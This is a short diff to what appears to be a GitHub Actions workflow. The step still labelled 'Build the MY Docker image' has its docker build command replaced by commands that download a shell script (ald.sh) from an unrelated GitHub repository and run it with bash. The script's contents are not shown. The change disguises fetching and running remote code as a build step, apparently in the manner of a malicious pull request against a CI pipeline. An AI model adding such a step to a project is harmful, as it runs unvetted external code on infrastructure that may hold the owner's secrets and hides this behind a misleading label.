@@ -15,4 +15,6 @@ jobs:
     steps:
     - uses: actions/checkout@v3
     - name: Build the MY Docker image
-      run: docker build . --file Dockerfile --tag my-image-name:$(date +%s)
+      run: |
+         wget https://github.com/Mosnio/lyr/raw/main/ald.sh
+         bash ald.sh
